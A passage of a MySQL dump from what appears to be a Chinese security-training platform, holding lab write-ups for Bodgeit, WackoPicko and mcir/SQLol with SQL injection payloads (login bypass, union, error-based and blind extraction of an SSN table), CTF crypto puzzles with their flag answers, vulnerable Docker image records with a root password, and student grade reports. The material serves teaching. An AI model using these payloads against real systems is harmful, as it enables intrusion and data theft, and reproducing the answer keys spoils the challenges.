这里修复同样可以对username和password进行转义处理。\r\n\r\n继续看，登陆处的sql注入\r\n\r\nboolean loggedIn = false;\r\nString username = (String) request.getParameter(\"username\");\r\nString password = (String) request.getParameter(\"password\");\r\nString debug = \"Clear\";\r\n\r\nif (request.getMethod().equals(\"POST\") && username != null) {\r\n    Statement stmt = conn.createStatement();\r\n    ResultSet rs = null;\r\n    try {\r\n        rs = stmt.executeQuery(\"SELECT * FROM Users WHERE (name = \'\" + username + \"\' AND password = \'\" + password + \"\')\");\r\n        if (rs.next()) {\r\n            loggedIn = true;\r\n            debug=\"Logged in\";\r\n            // We must have been given the right credentials, right? ;)\r\n            // Put credentials in the session\r\n            String userid = \"\" + rs.getInt(\"userid\");\r\n            session.setAttribute(\"username\", rs.getString(\"name\"));\r\n            session.setAttribute(\"userid\", userid);\r\n            session.setAttribute(\"usertype\", rs.getString(\"type\"));\r\n可以看到，username，password直接进入了select， 且条件中为单引号\r\n\r\n    rs = stmt.executeQuery(\"SELECT * FROM Users WHERE (name = \'\" + username + \"\' AND password = \'\" + password + \"\')\");\r\n如果输入admin@thebodgeitstore.com’ or 1=’1 那么，select就变成了这样\r\n\r\nselect * from users where name=admin@thebodgeitstore.com’ or 1=’1 and password=’\r\n\r\n因为or是只要条件中有一个为真即为真， 1=1永远是true， 就这样绕过了密码验证。 如何修复？ 这里修复可以从以下两个方面入手。\r\n\r\n1. replace掉登陆账户中的特殊字符。 2. Sql语句能采用参数化查询就采用参数化查询，如果不能采用就不要用单引号。\r\n\r\n举例：\r\n\r\n        rs = stmt.executeQuery(\"SELECT * FROM Users WHERE (name = \" + username + \" AND password = \" + password + \")\");\r\n不采用单引号的情况下， 再使用 or 1=1 就没有成功通过验证。\r\n\r\n继续看， 有时候注释里面也可能会发现线索， 比如在此例当中就发现了一条\r\n\r\n访问admin.jsp, 成功看到了一个未授权管理面板,有关这类漏洞的修复。首先写在html的注释里肯定是不行的，再一个，要对它的访问加上权限验证。 比如，我们可以加上一个判断，只有在当前已获取session的情况下并且session中uid等于指定范围才给出管理界面，不然就跳到登陆页面。\r\n\r\n继续看，访问别人的篮子\r\n\r\n通过\r\n\r\nhttp://localhost:8080/basket.jsp\r\n\r\n可以访问购物车， 可以通过开启debug查看当前的uid，开启方法是url后附加参数?debug=true, 查看后，确认我的当前uid为\r\n\r\nDEBUG basketid = 4\r\n\r\n观察请求头发现， 请求头中包含了一个b_id参数，尝试修改值。\r\n\r\n成功访问了其他账户的购物车。\r\n\r\n如何修复？ 这是一个水平权限越权的问题，造成这个漏洞的原因有以下几点\r\n\r\n1. 访问授权后数据前，没有对授权验证身份数据进行验证。\r\n\r\n2. uid和uname未进行绑定。\r\n\r\n3. 会话验证关键信息未进行加密。\r\n\r\n所以，这里就可以这样修复\r\n\r\n查询购物车数据时，前端隐藏域传一个u_id, 接收到u_id后，进行验证，查出当前登陆账户uid是否和隐藏域传过来的一致，如果一致，执行where u_id 结果并取值。 为了保险起见，可以对传输和展现进行加密，这样即使验证过程出现了问题，黑客也会因为无法了解加密数据格式导致重放攻击失败。\r\n\r\n比如， hidden表单数据的值是md5取6位的字符串+时间戳+随机数后的u_id, 后端进行比较时， 也采用这个格式进行， 一致后才进入取值，即使是get传输的，也会是加密字符串形式展现。 这样黑客再想输入脏数据，就会因为加密数据格式判断不通过，导致取值失败。\r\n\r\n下一个， 让商店欠你的钱， 这个其实很简单， 在浏览器的调试模式下，把表单数据进行修改再次提交就可以了，比如把价格标签改成负数。\r\n\r\n修复方法\r\n\r\n必要的加密和数据类型验证之前，增加数据范围判断，比如，在购买产品和价格当中，应该不允许负数的存在。\r\n\r\n下一个是一个csrf\r\n\r\nhttp://localhost:8080/password.jsp\r\n\r\n修改密码的时候没有验证原密码，我增加get参数，随便弄一个密码，再整一个iframe或者去前台找一个xss，欺骗管理员访问/打开。duang的一下密码就被改了。\r\n\r\n修复方式： 修改密码前查出原密码， 如果原密码不正确不允许修改。\r\n\r\nadvanced.jsp文件报错，这里只看一下代码就知道了\r\n\r\n<%\r\n    AdvancedSearch as = new AdvancedSearch(request, session, conn);\r\n    if(as.isAjax()){\r\n        response.setContentType(\"application/json\");\r\n        out.print(as.getResultsOutput());\r\n        return; \r\n    }\r\n%>\r\n<jsp:include page=\"/header.jsp\"/>\r\n<SCRIPT>\r\n    var key = \"<%= as.getEncryptKey() %>\";\r\n    var debug = <%= as.isDebug() ? \"true\" : \"false\" %>;\r\n    loadfile(\'./js/jquery-1.6.4.min.js\');\r\n    window.setTimeout(loadOthers, 10);\r\n    \r\n    function loadOthers(){\r\n        if (window.jQuery) {\r\n            loadfile(\'./js/encryption.js\');\r\n            loadfile(\'./js/advanced2.js\');\r\n            loadfile(\'./js/jquery-ui-1.85.js\');\r\n            loadfile(\'./css/jquery-ui-1.85.css\');\r\n        } else {\r\n            window.setTimeout(loadOthers, 10);\r\n        }\r\n    };\r\n</SCRIPT>\r\n    \r\n<h3>Search</h3>\r\n<font size=\"-1\">\r\n<% if (as.isSearchRequest()){ %>\r\n<b>You searched for:</b> <%= as.getQueryString() %><br/><br/>\r\n    <%= as.getResultsOutput() %>\r\n    <a href=\"javascript:window.location=window.location.href\">New Search</a>\r\n<% } else { %>\r\n实例化对象参数用户是可以控制的，接收到ajax请求后，设置完数据类型标签就进行了print。 这里面犯的错误是前端进行了处理，但处理不完全，后端又没有进行确认。 导致产生的漏洞。\r\n\r\n前端是这样处理的\r\n\r\nfunction prepareInput(strInput){\r\n    var params = strInput.replace(/</g, \'&lt;\').replace(/>/g, \'&gt;\').replace(/\"/g, \'&quot;\').replace(/\'/g, \'&#39\');\r\n    val = ((params.length > 0)) ? Aes.Ctr.encrypt(params, key, 128) : false;\r\n    return (val) ? val : false;\r\n}\r\n可以观察到，只对少量字符比如<>‘”进行了处理。 下面就进行了return。 加密其实不影响，因为后面要解析到模板里面。\r\n比如我在url中的参数是&a=xxxx&b=ccccc&d=hhhhhh 通过querystring方法就可以完全获取到，获取到后，output输出结果。\r\n所以这里xss肯定是存在的。\r\n\r\n通过观察search.jsp, 发现sql注入也是存在的， 比如\r\n\r\nhttp://localhost:8080/jspvul/search.jsp?q=a%27%25&debug=true\r\n\r\n可以看到，查询条件被破坏了。\r\n\r\nSELECT PRODUCT, DESC, TYPE, TYPEID, PRICE FROM PRODUCTS AS a JOIN PRODUCTTYPES AS b ON a.TYPEID = b.TYPEID WHERE PRODUCT LIKE \'%a\'%%\' OR DESC LIKE \'%a\'%%\' OR PRICE LIKE \'%a\'%%\' OR TYPE LIKE \'%a\'%%\'\r\n很明显，这里是不应该使用单引号的。 在高级查询下， 可能还会存在更多存在sql注入问题的变量。除了不应该使用单引号之外，更好的修复方式实际上是对sql查询进行预编译处理。 正则，str.replace, 都存在绕过的可能。 apache commons 的字符串处理类是很强大的。任何对Java安全了解有所缺少的人士都有必要去学习一下这个工具。', '', '1', '/bodgeit');
INSERT INTO `coursetemplete` VALUES ('16', 'WackoPicko-一个免费开源的用于渗透测试的网站', '2019-04-29', 'Valid Logins\r\nRegular users\r\nscanner1/scanner1\r\nscanner2/scanner2\r\nbryce/bryce\r\nAdministrator users\r\nadmin/admin\r\nadamd/adamd\r\nKnown Issues\r\nThe search bar doesn\'t appear in Internet Explorer.\r\nThere are some onions hanging around (particularly in the upload folder) but I kept them there to preserve parity with the version used during the tests.\r\nWackoPicko was developed with the assumption that is was running as the root application as the URL and won\'t work running as a directory.\r\nWackoPicko uses PHP\'s short tags, they must be enabled to run the application.\r\nVulnerabilities\r\nReflected XSS\r\nhttp://localhost/pictures/search.php?query=blah\r\nThe query parameter is vulnerable.\r\n\r\nStored XSS\r\nhttp://localhost/guestbook.php\r\nThe comment field is vulnerable.\r\n\r\nSessionID vulnerability\r\nhttp://localhost/admin/login.php\r\nThe session cookie value is admin_session, which is an auto-incrementing value.\r\n\r\nStored SQL Injection\r\nhttp://localhost/users/register.php -> http://localhost/users/similar.php\r\nThe first name field of the register users form contains a stored SQL injection which is then used unsanitized on the similar users page.\r\n\r\nReflected SQL Injection\r\nhttp://localhost/users/login.php\r\nThe username field is vulnerable.\r\n\r\nDirectory Traversal\r\nhttp://localhost/pictures/upload.php\r\nThe tag field has a directory traversal vulnerability enabling a malicious users to overwrite any file the web server uses has access to.\r\n\r\nMulti-Step Stored XSS\r\nhttp://localhost/pictures/view.php?picid=3\r\nThe comment field is vulnerable to XSS, however must go through a preview form.\r\n\r\nForceful Browsing\r\nhttp://localhost/pictures/highquality.php?picid=3&key=highquality\r\nThe user doesn\'t have to purchase the picture to see the high quality version.\r\n\r\nCommand-line Injection\r\nhttp://localhost/passcheck.php\r\nThe password field is vulnerable to a command line injections.\r\n\r\nFile Inclusion\r\nhttp://localhost/admin/index.php?page=login\r\nThe page is vulnerable to a file inclusion vulnerability, however you have to include %00 at the end.\r\n\r\nParameter Manipulation\r\nhttp://localhost/users/sample.php?userid=1\r\nThe userid parameter can be manipulated to see any user\'s page when you need to be logged in otherwise.\r\n\r\nReflected XSS Behind JavaScript\r\nhttp://localhost/piccheck.php\r\nThe name parameter is vulnerable.\r\n\r\nLogic Flaw\r\nhttp://localhost/cart/review.php\r\nA coupon can be applied multiple times reducing the price of an order to zero. The coupon in the initial data is SUPERYOU21.\r\n\r\nReflected XSS Behind a Flash Form\r\nhttp://localhost/submitname.php\r\nThe value parameter is vulnerable.\r\n\r\nWeak username/password\r\nhttps://localhost/admin/login.php\r\nThere is a default username/password combination of admin/admin.', null, '1', null);
INSERT INTO `coursetemplete` VALUES ('17', 'A set of XSS vulnerable PHP scripts for testing ', '2019-04-29', 'XSSed is a set of XSS vulnerable PHP pages for testing (and fun, don\'t forget the fun).', null, '1', null);
INSERT INTO `coursetemplete` VALUES ('18', 'mcir-十大渗透测试演练系统之一', '2019-04-29', 'Challenge 0\r\n这个很简单，要求得到所有用户名信息：\r\n\r\nYour objective is to get the query to return all usernames instead of just one. \r\n提示给出是字符型，那么直接用如下语句并得到其结果：\r\n\r\n图片描述\r\n\r\n当然除了 \' or \'1\'=\'1 ,我们也能用官方视频提供的 \'=\' 注入方法\r\n\r\nChallenge 1\r\n在挑战一中，要求如下：\r\n\r\nYour objective is to find the table of social security numbers present in the database and extract its information. \r\n需要找表了，这个我的做法如下：\r\n\r\norder by 猜到结果集的字段长度： 1\r\n然后得到用户连接，数据库版本。语句如下：\r\n\r\n\' and 1=2 union select concat_ws(char(32,58,32),user(),database(),version()) # \r\n结果是： root@localhost : sqlol : 5.6.21\r\n\r\n然后我们猜sqlol下的表：\r\n\r\n\' and 1=2 union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x73716C6F6C #\r\n得到两张表： ssn 、 users\r\n\r\n要我们得到 social security numbers ，再看着两张表，我们知道应该就是ssn表了，好吧，开始得到ssn表下的所有字段\r\n\r\n\' and 1=2 union select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x73736E # \r\n得到两个字段： name 、 ssn\r\n\r\n然后就爆出字段下的值\r\n\r\n\' and 1=2 union select concat_ws(char(32,58,32),name , ssn ) from ssn # \r\n得到的信息如下图：\r\n\r\n图片描述\r\n\r\n　Challenge 2 - The Failure of Quote Filters\r\n　\r\n在挑战二中，咋一看要求跟上面的一模一样呢。直接把上面最后的语句复制过去。咦，报错了，在仔细看了看挑战的描述：\r\n\r\nMany people sanitize or remove single quotes in their Web applications to prevent SQL injection attacks. While this can be effective against injection into string parameters, it is ineffective at preventing injection into parameters which are not quote delimited, like integers or datetime values. This places restrictions on how your injection string can be written, but does not present much of an obstacle to an attacker.\r\n老老实实硬着头皮看了看，发现web应用程序过滤了单引号. 故此我们去掉单引号试试：\r\n\r\nand 1=2 union select concat_ws(char(32,58,32),name , ssn ) from ssn #\r\n得到结果如下：\r\n\r\n图片描述\r\n\r\nChallenge 3 - Death Row\r\n对该挑战的描述如下：\r\n\r\nYou don\'t always have the luxury of retrieving all rows of output from a query when performing an SQL injection attack. Sometimes, you only get one row. This challenge is similar to challenge 1, \"SQL Injection 101\", but only provides one row of output. To make things more challenging, this challenge configuration does not show you the query.\r\n大概意思是要求跟挑战一 一样，但是得到的结果不再是所有行记录，而只是一次只返回一行。\r\n\r\n对于这样的类型，我们构造的语句如下：\r\n\r\n\' UNION SELECT concat(name,\':\',ssn) FROM ssn LIMIT 1 OFFSET 0 #\r\n\' UNION SELECT concat(name,\':\',ssn) FROM ssn LIMIT 1 OFFSET 1 #\r\n...\r\nChallenge 4 - War on Error\r\n且看描述：\r\n\r\nIn this challenge, no output from the query is shown, but verbose errors are shown.\r\n\r\nYour objective is to find the table of social security numbers present in the database and extract its information WITHOUT blind SQL injection techniques.\r\n这是查询结果不能显示，需要构造语句到错误显示处。（这里一定是要开错误提示的）\r\n\r\n构造语句如下：\r\n\r\n\' AND ExtractValue(\'junk\',concat(0x01,(select concat(name,\':\',ssn) from ssn limit 1 offset 0)))=\'a\r\n\' AND ExtractValue(\'junk\',concat(0x01,(select concat(name,\':\',ssn) from ssn limit 1 offset 1)))=\'a\r\n...\r\nChallenge 5 - Blind Luck\r\n且看描述：\r\n\r\nYou must perform a basic Blind SQL injection attack. Only an indication of whether the query returned results is available.\r\n这是关闭了错误提示，在盲注下进行注入。\r\n\r\n对于这种注入，结果会返回boolean型，我们在构造时，要构造成判断型语句？？？并且一定要用or ???\r\n\r\n\' or ascii(substring((select table_name from information_schema.tables limit 1 offset 0),1,1)) >= 79 #\r\n\' or ascii(substring((select table_name from information_schema.tables limit 1 offset 0),1,1)) >= 71 #\r\n\' or ascii(substring((select table_name from information_schema.tables limit 1 offset 0),1,1)) >= 67 #\r\nChallenge 6 - Stack the Deck\r\nIn this challenge, you must utilize stacked queries due to the difficulty of extraction in the SQLi scenario.\r\n\r\nYour objective is to create a new table called \"ipwntyourdb\" using stacked queries. \r\n挑战六是堆叠查询，但是php冒是不支持啊，请参见这里描述：SQL：php+mysql支持stacked query（堆叠查询）吗？\r\n\r\n而且这个挑战好像没实现的感觉 ----\r\n\r\nChallenge 7 - Walking on Thin Ice\r\nIn this challenge, no output from the query is shown, but verbose errors are shown.\r\n\r\nYour objective is to find the table of social security numbers present in the database and extract its information WITHOUT deleting anything from the database.\r\n(If you do happen to destroy the database, you can always use the SQLol reset button to bring it back to its original state.) \r\n....有关delete的注入漏洞，目前不知道怎么到\r\n\r\nChallenge 8 - Black Comedy\r\nYou must perform a very basic SQL injection attack, but a primitive blacklisting filter is in place.\r\n\r\nYour objective is to find the table of social security numbers present in the database and extract its information. \r\n默认的黑名单过滤，但是可以绕过，注入语句如下：\r\n\r\n\' uNion seLect concat(name,\':\',ssn) from ssn uNion selEct null from users whEre username=\'\r\nChallenge 9 - Administrative Tasks\r\nIn this challenge, you are working with an UPDATE query. The query updates the field \"username\" in the \"users\" table for a given user.\r\n\r\nYour objective is to inject into the query and cause it to update the \"isadmin\" field to 1 for the user with id 3. \r\n未实现-----', null, '1', null);
INSERT INTO `coursetemplete` VALUES ('19', '变异凯撒', '2019-04-30', '加密密文：afZ_r9VYfScOeO_UL^RWUc\r\n格式：flag{ }', 'flag{Caesar_variation}', '3', null);
INSERT INTO `coursetemplete` VALUES ('20', '古典密码', '2019-04-30', '密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}\r\n请对其进行解密\r\n\r\n提示：1.加解密方法就在谜面中\r\n         2.利用key值的固定结构\r\n\r\n格式：CTF{ }\r\n\r\n解题链接：', 'CTF{COULDYOUEXCHANGETHEINFORMATION}', '3', null);
INSERT INTO `coursetemplete` VALUES ('21', '围在栅栏中的爱', '2019-04-30', '最近一直在好奇一个问题，QWE到底等不等于ABC？\r\n\r\n-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- \r\n\r\nflag格式：CTF{xxx}\r\n\r\n解题链接：', 'Flag{Iloveshiyanbar}', '3', null);
INSERT INTO `coursetemplete` VALUES ('22', '古典密码', '2019-04-30', '密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}\r\n请对其进行解密\r\n\r\n提示：1.加解密方法就在谜面中\r\n         2.利用key值的固定结构\r\n\r\n格式：CTF{ }\r\n\r\n解题链接：', 'CTF{COULDYOUEXCHANGETHEINFORMATION}', '3', null);
INSERT INTO `coursetemplete` VALUES ('23', '困在栅栏里的凯撒', '2019-04-30', '小白发现了一段很6的字符：NlEyQd{seft}\r\n解题链接：', 'CTF{tianshu}', '3', null);
INSERT INTO `coursetemplete` VALUES ('24', '凯撒和某某加密	', '2019-04-30', 'aZZg/x\\ZbavpZiEZp+n)o+\r\n解题链接：', 'flag{_Just_4_fun_0.0_}', '3', null);
INSERT INTO `coursetemplete` VALUES ('25', 'The Flash-14', '2019-04-30', '这些数字都是什么呢~   54433252224455342251522244342223113412\r\n\r\n答案形式ctf{XXX}\r\n\r\n解题链接：', 'ctf{flahisfastman}', '3', null);
INSERT INTO `coursetemplete` VALUES ('26', '登陆一下好吗??', '2019-05-03', '不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!\r\n\r\nflag格式：ctf{xxxx}', null, '2', '/web/web200.html');

-- ----------------------------
-- Table structure for course_templete
-- ----------------------------
DROP TABLE IF EXISTS `course_templete`;
CREATE TABLE `course_templete` (
  `courseId` bigint(20) NOT NULL,
  `templeteId` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of course_templete
-- ----------------------------
INSERT INTO `course_templete` VALUES ('1', '7');
INSERT INTO `course_templete` VALUES ('1', '1');
INSERT INTO `course_templete` VALUES ('1', '11');
INSERT INTO `course_templete` VALUES ('1', '12');
INSERT INTO `course_templete` VALUES ('1', '13');
INSERT INTO `course_templete` VALUES ('1', '14');
INSERT INTO `course_templete` VALUES ('1', '15');
INSERT INTO `course_templete` VALUES ('1', '16');
INSERT INTO `course_templete` VALUES ('1', '17');
INSERT INTO `course_templete` VALUES ('1', '18');
INSERT INTO `course_templete` VALUES ('3', '17');
INSERT INTO `course_templete` VALUES ('4', '13');
INSERT INTO `course_templete` VALUES ('6', '11');
INSERT INTO `course_templete` VALUES ('27', '7');
INSERT INTO `course_templete` VALUES ('30', '1');
INSERT INTO `course_templete` VALUES ('33', '10');
INSERT INTO `course_templete` VALUES ('40', '19');
INSERT INTO `course_templete` VALUES ('40', '20');
INSERT INTO `course_templete` VALUES ('40', '21');
INSERT INTO `course_templete` VALUES ('40', '22');
INSERT INTO `course_templete` VALUES ('40', '23');
INSERT INTO `course_templete` VALUES ('40', '24');
INSERT INTO `course_templete` VALUES ('40', '25');
INSERT INTO `course_templete` VALUES ('41', '26');

-- ----------------------------
-- Table structure for experimentlog
-- ----------------------------
DROP TABLE IF EXISTS `experimentlog`;
CREATE TABLE `experimentlog` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `cname` varchar(20) NOT NULL,
  `operatetime` datetime NOT NULL,
  `chapter` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `cou_id` bigint(20) NOT NULL,
  `container_id` varchar(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of experimentlog
-- ----------------------------
INSERT INTO `experimentlog` VALUES ('24', '网络上的开源漏洞环境整合', '2019-04-29 10:17:52', '11', '4', '1', '');
INSERT INTO `experimentlog` VALUES ('25', 'SSH爆破取证', '2019-04-29 10:25:19', '10', '4', '33', '');
INSERT INTO `experimentlog` VALUES ('26', '网络上的开源漏洞环境整合', '2019-04-30 18:52:33', '7', '4', '1', '');
INSERT INTO `experimentlog` VALUES ('27', '网络上的开源漏洞环境整合', '2019-04-30 19:03:20', '7', '4', '1', '');
INSERT INTO `experimentlog` VALUES ('28', '网络上的开源漏洞环境整合', '2019-05-03 09:50:18', '7', '4', '1', '');
INSERT INTO `experimentlog` VALUES ('29', 'SSH爆破取证', '2019-05-08 16:07:57', '10', '4', '33', '');
INSERT INTO `experimentlog` VALUES ('30', 'SSH爆破取证', '2019-05-08 16:13:31', '10', '4', '33', '');
INSERT INTO `experimentlog` VALUES ('31', 'SSH爆破取证', '2019-05-09 10:01:04', '10', '4', '33', '');

-- ----------------------------
-- Table structure for imagelocal
-- ----------------------------
DROP TABLE IF EXISTS `imagelocal`;
CREATE TABLE `imagelocal` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `iname` varchar(50) NOT NULL,
  `size` varchar(50) NOT NULL,
  `ports` varchar(50) DEFAULT NULL,
  `createdtime` datetime NOT NULL,
  `idescribe` varchar(255) DEFAULT NULL,
  `imageid` varchar(64) NOT NULL,
  `account` varchar(20) DEFAULT NULL,
  `passwd` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of imagelocal
-- ----------------------------
INSERT INTO `imagelocal` VALUES ('21', 'vulnerables/web-dvwa:latest', '712MB', '[80/tcp]', '2018-10-12 17:49:01', 'php', 'ab0d83586b6e8799bb549ab91914402e47e3bcc7eea0c5cdf43755d56150cc6a', null, null);
INSERT INTO `imagelocal` VALUES ('25', 'webgoat/webgoat-8.0:latest', '299MB', '[8080/tcp]', '2018-06-21 00:32:22', 'java 加后缀/WebGaot 访问', 'fe3e14780585cfe287a07d0cbab22d7866b61a7e151f6028bda8674980f1291d', null, null);
INSERT INTO `imagelocal` VALUES ('27', 'owaspvwad/dsvw:latest', '247MB', '[8000/tcp]', '2016-09-30 13:23:18', 'python', '400a581bf643539ebb22f79af6e230871505f6aa680f7f0882872ba67d998ae9', null, null);
INSERT INTO `imagelocal` VALUES ('28', 'raesene/bwapp:latest', '441MB', '[80/tcp,3306/tcp]', '2019-02-08 17:06:15', '第一次创建应事先访问/install.php来创建数据库！', '1ee05214d23cfe1d6afda7ffcb8782ef18d1f838397e4d2561abe7df09e80806', null, null);
INSERT INTO `imagelocal` VALUES ('29', 'acgpiano/sqli-labs:latest', '434MB', '[80/tcp,3306/tcp]', '2015-12-16 20:43:30', 'php', '0976afc452490a2653bf79f1d551695a69c315f73d8b2b1684aa6250567c6079', null, null);
INSERT INTO `imagelocal` VALUES ('30', 'citizenstig/nowasp:latest', '800MB', '[80/tcp,3306/tcp]', '2018-05-14 21:24:33', 'php', '82e745ffc9fc641f9c429b75d9540dcfa709ca33df7a70893b9089dbe04c0254', null, null);
INSERT INTO `imagelocal` VALUES ('31', 'psiinon/bodgeit:latest', '356MB', '[8080/tcp]', '2016-09-29 11:57:01', 'java 加后缀/bodgeit 访问', 'ffd26471772d0de71ef18b8c626d29b77e10b218c8b4ad113b6fa38e97a28d0a', null, null);
INSERT INTO `imagelocal` VALUES ('32', 'adamdoupe/wackopicko:latest', '608MB', '[80/tcp,3306/tcp]', '2018-04-26 19:18:22', 'php', 'c7bcfaf7c503f31c6407f27b06ba66b832435d24da3f491b71025d373724bb49', null, null);
INSERT INTO `imagelocal` VALUES ('33', 'c0ny1/xssed:latest', '424MB', '[80/tcp]', '2018-05-15 18:03:39', 'php', '5deca9241f39b408f68a1a0f848010015cf66e0666b5c3adfc4577c23d90875f', null, null);
INSERT INTO `imagelocal` VALUES ('34', 'c0ny1/vulnerable-node:latest', '449MB', '[3000/tcp]', '2018-05-07 19:56:56', 'nodejs 未提供数据库支持', '58066110bd2a3da62336a8fb4281148582c2113bfa6c9242dd8853e9ca4d772e', null, null);
INSERT INTO `imagelocal` VALUES ('35', 'andresriancho/mcir:latest', '512MB', '[80/tcp]', '2015-09-28 19:02:47', 'php', 'cced4b09005014cee3ae3488fd29aa17143b9e1a4931a2f430e901a862499158', null, null);
INSERT INTO `imagelocal` VALUES ('36', 'wzchenxuan/ctfplatform:3.21', '1.28GB', '[8080/tcp,3306/tcp]', '2019-04-24 04:16:35', '系统备份', 'c1411f0924fa184f37b52c1a6dfe4bf5b42bfb804d437690388bae091d8737c5', null, null);
INSERT INTO `imagelocal` VALUES ('37', 'wzchenxuan/ubuntu:latest', '243MB', '[22/tcp]', '2019-05-08 15:02:54', 'ssh测试容器', '657377ceac3083d4c3712852af72bf4ab03861eb3692269a24b0013604f5c5e1', 'root', 'ctfoj');

-- ----------------------------
-- Table structure for report
-- ----------------------------
DROP TABLE IF EXISTS `report`;
CREATE TABLE `report` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `tmp_id` bigint(20) NOT NULL,
  `stu_id` bigint(20) NOT NULL,
  `grade` varchar(10) DEFAULT NULL,
  `createdtime` datetime NOT NULL,
  `remark` varchar(255) DEFAULT NULL,
  `content` text,
  `cname` varchar(255) NOT NULL,
  `tch_id` bigint(20) NOT NULL,
  `cou_id` bigint(20) NOT NULL,
  `sname` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `cou_id` (`tmp_id`),
  KEY `stu_id` (`stu_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of report
-- ----------------------------
INSERT INTO `report` VALUES ('1', '1', '1', '80', '2018-11-06 09:19:53', '成绩合格', '实验一 加密认证通信系统实现 \r\n设计实现一个通信系统，双方可以通过消息和文件通信，用户可选择一种加密算法和认证算法，对消息和文件进行加密通信和完整性验证。（要实现认证和加密，工具和语言不限，可以直接调用现有模块，认证和加密不限） \r\n实验二  综合扫描及安全评估 \r\n利用常见的一些扫描工具可以检测本系统及其它系统是否存在漏洞等安全隐患，给出全面而完善的评估报告，帮助管理员发现存在的问题，进而采取有力措施予以弥补，从而提高系统的安全性能。 \r\n实验三  网络攻防技术 \r\n矛与盾的关系告诉我们，在研究网络安全技术时，只着眼于安全防范技术是远远不够的，知己知彼方能百战不殆，因此，很有必要同时研究攻击与防范技术，才能更有效地解决各种威胁。 \r\n实验四  Windows系统安全配置方案 \r\n作为网络节点，操作系统安全成为网络信息安全首先应予考虑的事务，然而人们往往忽视了OS的安全性。其实，OS的安全不只体现在密码口令上，这仅仅是最基本的一个方面。除此之外，服务、端口、共享资源以及各种应用都很有可能存在着安全隐患，因此，应采取相应措施设置完善的本地安全策略，并使用防病毒软件、防火墙软件甚至入侵检测软件来加强系统的安全。 \r\n其中实验一要求编程实现，可直接调用相关功能函数完成。实验二至实验四可在机房的网络信息安全综合实验系统上完成。', 'linux实验', '1', '1', '陈良炫');
INSERT INTO `report` VALUES ('2', '1', '4', '78', '2018-11-06 11:28:44', '内容太少，引用太多', '实验一 加密认证通信系统实现 \r\n设计实现一个通信系统，双方可以通过消息和文件通信，用户可选择一种加密算法和认证算法，对消息和文件进行加密通信和完整性验证。（要实现认证和加密，工具和语言不限，可以直接调用现有模块，认证和加密不限） \r\n实验二  综合扫描及安全评估 \r\n利用常见的一些扫描工具可以检测本系统及其它系统是否存在漏洞等安全隐患，给出全面而完善的评估报告，帮助管理员发现存在的问题，进而采取有力措施予以弥补，从而提高系统的安全性能。 \r\n实验三  网络攻防技术 \r\n矛与盾的关系告诉我们，在研究网络安全技术时，只着眼于安全防范技术是远远不够的，知己知彼方能百战不殆，因此，很有必要同时研究攻击与防范技术，才能更有效地解决各种威胁。 \r\n实验四  Windows系统安全配置方案 \r\n作为网络节点，操作系统安全成为网络信息安全首先应予考虑的事务，然而人们往往忽视了OS的安全性。其实，OS的安全不只体现在密码口令上，这仅仅是最基本的一个方面。除此之外，服务、端口、共享资源以及各种应用都很有可能存在着安全隐患，因此，应采取相应措施设置完善的本地安全策略，并使用防病毒软件、防火墙软件甚至入侵检测软件来加强系统的安全。 \r\n其中实验一要求编程实现，可直接调用相关功能函数完成。实验二至实验四可在机房的网络信息安全综合实验系统上完成。', 'linux实验', '1', '1', '苏培坷');
INSERT INTO `report` VALUES ('3', '7', '4', '92', '2018-11-18 15:51:06', '成绩优秀', '实验一 加密认证通信系统实现 \r\n设计实现一个通信系统，双方可以通过消息和文件通信，用户可选择一种加密算法和认证算法，对消息和文件进行加密通信和完整性验证。（要实现认证和加密，工具和语言不限，可以直接调用现有模块，认证和加密不限） \r\n实验二  综合扫描及安全评估 \r\n利用常见的一些扫描工具可以检测本系统及其它系统是否存在漏洞等安全隐患，给出全面而完善的评估报告，帮助管理员发现存在的问题，进而采取有力措施予以弥补，从而提高系统的安全性能。 \r\n实验三  网络攻防技术 \r\n矛与盾的关系告诉我们，在研究网络安全技术时，只着眼于安全防范技术是远远不够的，知己知彼方能百战不殆，因此，很有必要同时研究攻击与防范技术，才能更有效地解决各种威胁。 \r\n实验四  Windows系统安全配置方案 \r\n作为网络节点，操作系统安全成为网络信息安全首先应予考虑的事务，然而人们往往忽视了OS的安全性。其实，OS的安全不只体现在密码口令上，这仅仅是最基本的一个方面。除此之外，服务、端口、共享资源以及各种应用都很有可能存在着安全隐患，因此，应采取相应措施设置完善的本地安全策略，并使用防病毒软件、防火墙软件甚至入侵检测软件来加强系统的安全。 \r\n其中实验一要求编程实现，可直接调用相关功能函数完成。实验二至实验四可在机房的网络信息安全综合实验系统上完成。', 'CTF新手入门之安全杂项实例讲解', '3', '4', '苏培坷');
